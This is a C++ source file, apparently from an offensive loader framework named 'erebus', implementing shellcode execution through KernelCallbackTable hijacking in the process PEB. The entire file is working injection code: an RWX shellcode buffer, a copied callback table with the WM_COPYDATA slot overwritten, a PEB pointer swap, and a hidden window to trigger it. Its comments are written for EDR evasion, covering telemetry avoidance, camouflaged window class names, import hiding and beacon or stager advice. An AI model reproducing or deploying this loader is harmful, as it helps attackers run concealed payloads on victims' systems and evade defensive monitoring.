// KernelCallbackTable Injection (CONFIG_INJECTION_TYPE == 7)
//
// OPSEC profile:
//   No cross-process WriteProcessMemory, no new remote thread, no new section.
//   The entire attack surface is two VirtualAlloc calls (both in-process), a
//   single pointer write to the PEB, and a SendMessage that never leaves the
//   process boundary because the target window lives in the same thread.
//   Usermode PEB writes are not blocked by PatchGuard (PG only defends kernel
//   structures); however, ETW-Ti and usermode APC-based hooks can observe PEB
//   field mutations if the EDR instruments NtWriteVirtualMemory or uses a VEH.
//
//   Window creation may generate telemetry if the EDR uses a SetWindowsHookEx
//   WH_CALLWNDPROC hook or WMI process/window-event subscriptions.
//
// KCT index 0x5E (decimal 94) maps to __fnCOPYDATA on Win10/11 x64 RTM through
// 22H2. Microsoft has shuffled the table in some insider builds; verify the
// index on the specific target build before deployment (use WinDbg:
//   dt nt!_KERNELCALLBACKTABLE and count to the WM_COPYDATA handler).
//
// Index resolution priority (runtime, no import):
//   1. RtlGetVersion build-number lookup in kKctBuildTable.
//   2. user32.dll VA range scan: any KCT slot pointing into user32 is a valid
//      hijack target (WM_COPYDATA slot is conventional; any slot works).
//   3. Static fallback 0x5E (covers all known production builds as of 24H2).
//
// MALLEABLE: add new { buildMin, buildMax, index } rows to kKctBuildTable when
//   MS shuffles the table in a future build. Confirm index with WinDbg:
//     dt nt!_KERNELCALLBACKTABLE then count to __fnCOPYDATA, or
//     bp user32!__fnCOPYDATA; g; k

#include "../../include/loader.hpp"
#include <intrin.h>

namespace erebus {
#if CONFIG_INJECTION_TYPE == 7

	// KCT entry count: the table has 256 slots on all x64 Windows versions
	// examined. 256 * sizeof(PVOID) = 2048 bytes - a known upper bound.
	static constexpr SIZE_T KCT_ENTRY_COUNT  = 256;
	static constexpr SIZE_T KCT_INDEX_DEFAULT = 0x5E; // fallback; valid Win10 10240 – Win11 26100

	// Window class name - keep it generic to blend with app framework noise.
	static constexpr const char* kWndClass = "WorkerW";

	// ---------------------------------------------------------------------------
	// RtlGetVersion inline struct - avoids a winternl.h dependency.
	// ---------------------------------------------------------------------------
	typedef struct _EREBUS_OSVERSIONINFOW {
		ULONG dwOSVersionInfoSize;
		ULONG dwMajorVersion;
		ULONG dwMinorVersion;
		ULONG dwBuildNumber;
		ULONG dwPlatformId;
		WCHAR szCSDVersion[128];
	} EREBUS_OSVERSIONINFOW;

	// ---------------------------------------------------------------------------
	// Build-number → KCT index lookup table.
	// Ranges are [buildMin, buildMax] inclusive. Ordered ascending.
	// MALLEABLE: add rows as new Windows releases publish changed KCT layouts.
	// ---------------------------------------------------------------------------
	struct KctBuildEntry { ULONG buildMin; ULONG buildMax; SIZE_T index; };
	static constexpr KctBuildEntry kKctBuildTable[] = {
		// Win10 1507 (10240) through Win10 22H2 (19045): __fnCOPYDATA = 0x5E
		{ 10240, 19045, 0x5E },
		// Win11 21H2 (22000) through Win11 23H2 (22631): __fnCOPYDATA = 0x5E
		{ 22000, 22631, 0x5E },
		// Win11 24H2 (26100): confirmed 0x5E via WinDbg public symbols.
		// [MALLEABLE] re-verify on future 26xxx insider builds.
		{ 26100, 26999, 0x5E },
	};

	// Resolve the __fnCOPYDATA KCT index via RtlGetVersion.
	// Returns 0 if the build is not in the table (triggers scan fallback).
	static SIZE_T ResolveKctIndexByVersion() {
		typedef LONG (WINAPI* fnRtlGetVersion)(EREBUS_OSVERSIONINFOW*);

		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (!ntdll) return 0;

		fnRtlGetVersion pRtlGetVersion =
			(fnRtlGetVersion)GetProcAddress(ntdll, "RtlGetVersion");
		if (!pRtlGetVersion) return 0;

		EREBUS_OSVERSIONINFOW osvi = {};
		osvi.dwOSVersionInfoSize = sizeof(osvi);
		if (pRtlGetVersion(&osvi) != 0 /* STATUS_SUCCESS */) return 0;

		LOG_INFO("OS: %lu.%lu build %lu", osvi.dwMajorVersion,
		         osvi.dwMinorVersion, osvi.dwBuildNumber);

		for (SIZE_T i = 0; i < sizeof(kKctBuildTable) / sizeof(kKctBuildTable[0]); ++i) {
			if (osvi.dwBuildNumber >= kKctBuildTable[i].buildMin &&
			    osvi.dwBuildNumber <= kKctBuildTable[i].buildMax) {
				return kKctBuildTable[i].index;
			}
		}
		return 0; // unknown build
	}

	// Scan the live KCT for any pointer inside user32.dll's mapped VA range.
	// Any KCT slot pointing into user32 is a valid hijack target; we pick the
	// lowest index. The scanned slot may differ from __fnCOPYDATA but the
	// WM_COPYDATA SendMessage still triggers it via whichever slot we patched.
	static SIZE_T ScanKctForUser32Slot(PVOID* kct, SIZE_T count) {
		HMODULE user32 = GetModuleHandleA("user32.dll");
		if (!user32) return 0;

		// Walk VirtualQuery to sum all pages sharing the same AllocationBase
		// as user32.dll. This gives the full committed range without psapi.dll.
		ULONG_PTR u32Base = (ULONG_PTR)user32;
		ULONG_PTR u32End  = u32Base;
		MEMORY_BASIC_INFORMATION mbi = {};
		ULONG_PTR addr = u32Base;
		while (VirtualQuery((LPCVOID)addr, &mbi, sizeof(mbi)) &&
		       mbi.AllocationBase == (PVOID)user32) {
			u32End = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
			addr   = u32End;
		}

		for (SIZE_T i = 0; i < count; ++i) {
			ULONG_PTR ptr = (ULONG_PTR)kct[i];
			if (ptr >= u32Base && ptr < u32End) {
				LOG_INFO("KCT scan: user32 pointer at slot 0x%02zX", i);
				return i;
			}
		}
		return 0;
	}

	// Top-level resolver: version table → scan → static default.
	static SIZE_T ResolveKctIndex(PVOID* kct, SIZE_T count) {
		SIZE_T idx = ResolveKctIndexByVersion();
		if (idx != 0) {
			LOG_INFO("KCT index 0x%02zX (version table)", idx);
			return idx;
		}
		idx = ScanKctForUser32Slot(kct, count);
		if (idx != 0) {
			LOG_INFO("KCT index 0x%02zX (user32 scan)", idx);
			return idx;
		}
		LOG_INFO("KCT index 0x%02zX (static default)", KCT_INDEX_DEFAULT);
		return KCT_INDEX_DEFAULT;
	}

	VOID InjectionKernelCallback(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle)
	{
		LOG_INFO("Injection via KernelCallbackTable (PEB KCT hijack)");

		// Resolve user32.dll exports without ImportModule/ImportFunction because
		// those helpers walk ntdll's PEB loader list; user32.dll is present but
		// we need runtime addresses (the compiler would normally link these as
		// IAT entries, which leak import names to static analysis).
		HMODULE user32 = GetModuleHandleA("user32.dll");
		if (!user32) {
			// user32 may not be loaded in thin processes; force it.
			user32 = LoadLibraryA("user32.dll");
		}
		if (!user32) { LOG_ERROR("Failed to load user32.dll"); return; }

		typedef ATOM    (WINAPI* fnRegisterClassExA)(const WNDCLASSEXA*);
		typedef HWND    (WINAPI* fnCreateWindowExA)(DWORD, LPCSTR, LPCSTR, DWORD, int, int, int, int, HWND, HMENU, HINSTANCE, LPVOID);
		typedef LRESULT (WINAPI* fnSendMessageA)(HWND, UINT, WPARAM, LPARAM);
		typedef BOOL    (WINAPI* fnDestroyWindow)(HWND);
		typedef BOOL    (WINAPI* fnUnregisterClassA)(LPCSTR, HINSTANCE);
		typedef LRESULT (WINAPI* fnDefWindowProcA)(HWND, UINT, WPARAM, LPARAM);

		fnRegisterClassExA  pRegisterClassExA  = (fnRegisterClassExA) GetProcAddress(user32, "RegisterClassExA");
		fnCreateWindowExA   pCreateWindowExA   = (fnCreateWindowExA)  GetProcAddress(user32, "CreateWindowExA");
		fnSendMessageA      pSendMessageA      = (fnSendMessageA)     GetProcAddress(user32, "SendMessageA");
		fnDestroyWindow     pDestroyWindow     = (fnDestroyWindow)    GetProcAddress(user32, "DestroyWindow");
		fnUnregisterClassA  pUnregisterClassA  = (fnUnregisterClassA) GetProcAddress(user32, "UnregisterClassA");
		fnDefWindowProcA    pDefWindowProcA    = (fnDefWindowProcA)   GetProcAddress(user32, "DefWindowProcA");

		if (!pRegisterClassExA || !pCreateWindowExA || !pSendMessageA ||
		    !pDestroyWindow    || !pUnregisterClassA || !pDefWindowProcA)
		{
			LOG_ERROR("Failed to resolve one or more user32 exports");
			return;
		}

		// Read the PEB via the GS segment base - __readgsqword(0x60) is the
		// documented, compiler-intrinsic equivalent of NtCurrentPeb(). MinGW
		// supports this intrinsic natively on x64.
		PPEB peb = (PPEB)__readgsqword(0x60);
		PVOID* original_kct = (PVOID*)peb->KernelCallbackTable;

		if (!original_kct) {
			// KCT is NULL in processes that have never called into win32k.
			// Force user32 initialisation by touching a window API that
			// triggers win32k process registration.
			LOG_ERROR("KernelCallbackTable is NULL - process not win32k-registered");
			return;
		}

		LOG_INFO("KernelCallbackTable at 0x%p", original_kct);

		// Resolve the KCT slot to hijack: version table → scan → default.
		const SIZE_T KCT_INDEX_COPYDATA = ResolveKctIndex(original_kct, KCT_ENTRY_COUNT);

		// Allocate the shellcode buffer as RWX in a single step. Keeping the
		// buffer private (not section-backed) avoids the overhead of NtCreateSection
		// but does leave a MEM_PRIVATE RWX VAD entry. Swap to the double-map
		// pattern from InjectionNtMapViewOfSection if VAD hygiene matters more
		// than simplicity for this deployment.
		PVOID shellcode_buf = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (!shellcode_buf) {
			LOG_ERROR("VirtualAlloc(shellcode) failed (Code: 0x%08lX)", GetLastError());
			return;
		}
		RtlCopyMemory(shellcode_buf, shellcode, shellcode_size);

		// Allocate a new KCT large enough for all 256 entries, then copy the
		// original table so every unpatched entry keeps its legitimate handler.
		// Allocating PAGE_READWRITE (not RWX) - the table holds function pointers,
		// not executable code. The CPU never fetches from the table itself.
		PVOID* new_kct = (PVOID*)VirtualAlloc(NULL, KCT_ENTRY_COUNT * sizeof(PVOID), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!new_kct) {
			LOG_ERROR("VirtualAlloc(new KCT) failed (Code: 0x%08lX)", GetLastError());
			VirtualFree(shellcode_buf, 0, MEM_RELEASE);
			return;
		}
		RtlCopyMemory(new_kct, original_kct, KCT_ENTRY_COUNT * sizeof(PVOID));

		// Overwrite the __fnCOPYDATA slot with our shellcode pointer.
		// All other slots remain as legitimate user32.dll handlers.
		new_kct[KCT_INDEX_COPYDATA] = shellcode_buf;

		// Atomic pointer swap - write the new KCT address into PEB.
		// This is the only PEB mutation in the technique; it is observable via
		// an ETW-Ti kernel callback but not blocked.
		peb->KernelCallbackTable = (PVOID)new_kct;
		LOG_SUCCESS("PEB->KernelCallbackTable swapped to 0x%p", new_kct);

		// Register a minimal window class backed by DefWindowProcA.
		// WS_EX_TOOLWINDOW suppresses the taskbar entry; SW_HIDE keeps it
		// off-screen. The window exists only to deliver the WM_COPYDATA message.
		WNDCLASSEXA wc     = {};
		wc.cbSize          = sizeof(wc);
		wc.lpfnWndProc     = (WNDPROC)pDefWindowProcA;
		wc.hInstance       = GetModuleHandleA(NULL);
		wc.lpszClassName   = kWndClass;
		pRegisterClassExA(&wc);

		HWND hwnd = pCreateWindowExA(
			WS_EX_TOOLWINDOW,
			kWndClass,
			NULL,
			WS_OVERLAPPED,
			0, 0, 0, 0,
			HWND_MESSAGE,   // message-only window - invisible, no desktop placement
			NULL,
			wc.hInstance,
			NULL
		);

		if (!hwnd) {
			LOG_ERROR("CreateWindowExA failed (Code: 0x%08lX)", GetLastError());
			peb->KernelCallbackTable = (PVOID)original_kct;
			VirtualFree(new_kct,       0, MEM_RELEASE);
			VirtualFree(shellcode_buf, 0, MEM_RELEASE);
			pUnregisterClassA(kWndClass, wc.hInstance);
			return;
		}

		LOG_INFO("Triggering KCT[0x%02zX] via WM_COPYDATA", KCT_INDEX_COPYDATA);

		// win32k dereferences lParam as COPYDATASTRUCT* in its WM_COPYDATA dispatch
		// path before calling KCT[0x5E]. NULL lParam triggers a kernel-side AV that
		// kills the process before shellcode is reached. Provide a valid (empty) CDS.
		COPYDATASTRUCT cds = {};
		// SendMessage is synchronous - it dispatches into win32k, which looks up
		// KCT[0x5E] and calls our shellcode pointer. Execution returns here only
		// after the shellcode returns (or crashes). This means the shellcode must
		// return cleanly; use a stager or a beacon that loops internally.
		pSendMessageA(hwnd, WM_COPYDATA, (WPARAM)hwnd, (LPARAM)&cds);

		// Restore the original KCT before any cleanup so that window
		// destruction messages dispatched by DestroyWindow find valid handlers.
		peb->KernelCallbackTable = (PVOID)original_kct;
		LOG_SUCCESS("KernelCallbackTable restored to original");

		pDestroyWindow(hwnd);
		pUnregisterClassA(kWndClass, wc.hInstance);

		// Shellcode buffer must remain live until after the shellcode returns
		// (which it already has by this point). Free now.
		VirtualFree(new_kct,       0, MEM_RELEASE);
		VirtualFree(shellcode_buf, 0, MEM_RELEASE);

		LOG_SUCCESS("Injection Complete!");
	}

#endif
} // namespace erebus
